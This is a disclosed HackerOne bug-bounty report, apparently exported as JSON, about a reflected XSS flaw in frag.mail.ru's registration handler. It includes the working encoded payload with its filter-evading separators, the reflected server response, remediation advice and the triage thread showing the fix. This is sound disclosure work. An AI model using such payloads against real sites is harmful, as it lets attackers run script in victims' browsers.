{"id":214642,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMTQ2NDI=","url":"https://hackerone.com/reports/214642","title":"Reflected XSS on frag.mail.ru","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2017-03-19T12:16:40.844Z","submitted_at":"2017-03-19T12:16:40.844Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"twicedi","url":"/twicedi","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/137/256/a626d57f6616da68d19a09c985982ab0889019d7_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":65,"url":"https://hackerone.com/mailru","handle":"mailru","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/065/1ec04a6b87b02422d913b5c53d5247de91d64718_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/065/1ec04a6b87b02422d913b5c53d5247de91d64718_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Mail.ru","twitter_handle":"mailru","website":"https://corp.mail.ru","about":"Building the Internet since 1998"}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2017-05-10T14:56:05.232Z","bug_reporter_agreed_on_going_public_at":"2017-05-04T11:21:26.779Z","team_member_agreed_on_going_public_at":"2017-05-10T14:56:05.189Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"##Domain, site, application##\n\nThe \"frag.mail.ru\" is affected by a reflected XSS vulnerability on the \"/user/register/\" handler.\n\n\n##Testing environment##\n\nThe exploitation of the issue has been tested on the latest version (at the time of writing) of Firefox: 52.0.1 (both 32 and 64 bit) on Sierra and Windows 7 OS.\n\n##Steps to reproduce##\n\nTo exploit the issue the victim has to visit the following URL: https://frag.mail.ru/user/register/!%22--!%3E%3CImage%0CSrcset%3DK%0COnerror%3Dconfirm%601%60%0C\n\n##Actual results##\n\nSince the input is reflected inside the response and no output encoding is done the payload injected is executed inside the context of the webpage.\n\n##Expected results and recommendations##\n\nTo protect the application against cross-site scripting attacks, assume that all input is malicious. Constrain and validate all input. Encode all output that could, potentially, include HTML characters.\n\n##PoC, exploit code, screenshots, video, references, additional resources##\n\nBy visiting the following URL: https://frag.mail.ru/user/register/!%22--!%3E%3CImage%0CSrcset%3DK%0COnerror%3Dconfirm%601%60%0C on Firefox, the JavaScript code injected inside the payload is correclty executed, as showed in the following snippet of response and as it is possible to see in the screenshot attached.\n\nResponse:\n\n```\nHTTP/1.1 200 OK\nServer: nginx\nDate: Sun, 19 Mar 2017 11:51:36 GMT\nContent-Type: text/html; charset=utf-8\nConnection: close\nExpires: Sun, 19 Nov 1978 05:00:00 GMT\nLast-Modified: Sun, 19 Mar 2017 11:51:28 GMT\nCache-Control: store, no-cache, must-revalidate\nCache-Control: post-check=0, pre-check=0\nX-Filter-Time: 1.088 ms\nX-Res-Usage-Time: U=52000,S=8000,R=88202\nX-Frame-Options: SAMEORIGIN\nX-Content-Type-Options: nosniff\nStrict-Transport-Security: max-age=31536000\nContent-Length: 23218\n\n\u003c!DOCTYPE HTML\u003e\n\n[REDACTED...]\n\n\n\t\u003cdiv id=\"block_content\" class=\"user_register_!\"--!\u003e\u003cImage\fSrcset=K\fOnerror=confirm`1`\f\"\u003e\n\t\t\u003cdiv id=\"content\"\u003e\n\t\t\t\u003cdiv id=\"block_center\"\u003e\n\n\t\t\t\t\t\t\t\t\t\t\t\t\t\u003cdiv class=\"block_text\"\u003e\n\t\t\t\t\t\t\u003cdiv class=\"text_content_block\"\u003e\n\n\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\u003cdiv class=\"bg_title\"\u003e\n\t\t\t\t\t\t\t\t\t\u003cdiv class=\"title_userregister!\"--!\u003e\u003cImage\fSrcset=K\fOnerror=confirm`1`\f\"\u003e\n\n\t\t\t\t\t\t\t\t\t\u003c/div\u003e\n\t\t\t\t\t\t\t\t\u003c/div\u003e\n            \n\n[REDACTED...]\n```\n\nI'm available for further clarification,\n\nBest,\nDavide","weakness":{"id":61,"name":"Cross-site Scripting (XSS) - Reflected"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":169928,"file_name":"Reflected_XSS.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/169/928/af0fbcc30c2386d43bfdb2f0106019bf0af3a894/Reflected_XSS.png?response-content-disposition=attachment%3B%20filename%3D%22Reflected_XSS.png%22%3B%20filename%2A%3DUTF-8%27%27Reflected_XSS.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSZC7DXM7%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T140459Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJIMEYCIQC%2BDPA%2BSA%2BpuJvH4UEzvWiP4UFbtskzj7xfN6rqlPo4hwIhAOElSqCIqXNISLvxjY33BSsqOOcMi8dDWLDb%2FHD9us3YKoMECO7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgwLzMOGCwg6RS74p74q1wP3%2BrYZeAM77Rmdm64%2BCSKI7bN93GsX7JZ2tRccS6J5LGMRJTs%2By2W6iZRVDq3XbBt0e6p3WHVjfBqyc9ME6wkTlY9d%2Fv3J1DB8BCqWSb%2BRKzvSiDC8qrGE542%2FrwTG4%2F%2F%2B2GZboS%2Bwx6a4S2dscyeGXoZ%2FpJf5Uq70DiwjHjChb4otA36pPHn6Cbuljknt8dm165HwajfM%2FYT9DsRnV1w0OsaZyXvEEhwGsPTVDhkOXnM85nNGqSZ3QDaL%2FFoqr9dtCpsUJbXrXwy5kt3x0oz1dJ01X%2BzIddVtQMPL2ptVZ7U9zvXOF0wODPRFZiOr31TkuvFOSwxvOXUum3Wvfo9vzLL2sp7049bpk2pDp0SX1ErSpZmBqjAE1Syh%2Bgl%2BQXOk5uGw1WkZ%2Bi%2BVM0miZCx%2Fzk0YwCnQVNh8OZjtqzLjisdsfijlbUNbtSb%2F2rqQk5byOsnNd8EOB%2Fk4YSlr9Ml9Z%2FBjM39hyAylCG6PZXUBPl4i%2FIRvue2kJRbtUIpgVYXpDngioq0oVUItMzpWv1Dpeb3i%2BGYq1GpN7Q2SSm%2FKrlHtq%2FAe%2FUyoxvBMaLL9j8sY6VSMaDAw3WBbjN8GeRsrk6lj%2FvPn7De7XtYE3zRUmOhj70LaDvgw%2FfCQiwY6pAEB7X%2FT8tdYZNLCr%2BSBWKV0iIWafrBI43qKIrIcnQBlJSwVNOZ8Gcvl0OoNDa0QYgNpFyVQok8yJDR3W7a4ZqF2ZSs2yTdzPkNqbsgUkg9RTuuVzr%2BJ0IWfPqfOclYjbyvg8xSLdadzgsszfk0wXK8O0D9utoO42Qj4fAyRHUrDx8JxY18uWRPyFpidRfVqDlD%2FMzGvphFE58fBjncDPhIagYIJNw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=be440ad51d3806d674ee8ef4c47f00b4ab2bb56dc81e9ad4944ca11a54e2194c","file_size":828115,"type":"image/png"}],"allow_singular_disclosure_at":"2017-06-03T11:21:26.841Z","allow_singular_disclosure_after":-137472212.75246146,"singular_disclosure_allowed":true,"vote_count":6,"voters":["twicedi","eveeez","khizer47","spetr0x","jugno","superhedgy"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":1551687,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you for reporting your bug to Mail.Ru Group!   We appreciate your time for helping us to make our web services safer.\nWe are currently reviewing your submission and will be back in touch soon..\nUnfortunately,  your report is not in a bug bounty program's scope (check the [rules](https://hackerone.com/mailru)), so  we cannot qualify you for monetary reward. We say \"thank you\" for your help and contribution.","automated_response":false,"created_at":"2017-03-20T09:20:54.315Z","updated_at":"2017-03-20T09:20:54.315Z","actor":{"username":"3apa3a","cleared":false,"url":"/3apa3a","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/004/836/57b93fd96b524d0ed13eef717ecd070ad8468f86_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1551688,"is_internal":false,"editable":false,"type":"Activities::NotEligibleForBounty","message":"","automated_response":false,"created_at":"2017-03-20T09:21:00.339Z","updated_at":"2017-03-20T09:21:00.339Z","actor":{"url":"/mailru","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/065/1ec04a6b87b02422d913b5c53d5247de91d64718_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Mail.ru"}},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1618404,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Your bug has been fixed! \nPlease confirm that you are no longer able to reproduce the issue. ","automated_response":false,"created_at":"2017-04-18T14:38:25.572Z","updated_at":"2017-04-18T14:38:25.572Z","actor":{"username":"kpebetka","cleared":false,"url":"/kpebetka","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/152/f71d69995e3032fd2225ed83dd75c81e8158a865_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"twicedi","url":"/twicedi"},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1621805,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank @kpebetka for the update!\n\nIt seems that the target is no longer reachable so it is not possible to reproduce the issue.\n\nBest,\nDavide","automated_response":false,"created_at":"2017-04-19T18:35:27.710Z","updated_at":"2017-04-19T18:35:27.710Z","actor":{"username":"twicedi","cleared":false,"url":"/twicedi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/137/256/a626d57f6616da68d19a09c985982ab0889019d7_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1653512,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Can we disclose it?\n\nThanks,\nDavide","automated_response":false,"created_at":"2017-05-04T11:21:26.802Z","updated_at":"2017-05-04T11:21:26.802Z","first_to_agree":true,"actor":{"username":"twicedi","cleared":false,"url":"/twicedi","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/137/256/a626d57f6616da68d19a09c985982ab0889019d7_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1665877,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2017-05-10T14:56:05.209Z","updated_at":"2017-05-10T14:56:05.209Z","actor":{"username":"kpebetka","cleared":false,"url":"/kpebetka","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/152/f71d69995e3032fd2225ed83dd75c81e8158a865_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1665878,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2017-05-10T14:56:05.248Z","updated_at":"2017-05-10T14:56:05.248Z","actor":{"username":"kpebetka","cleared":false,"url":"/kpebetka","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/152/f71d69995e3032fd2225ed83dd75c81e8158a865_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mailru","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}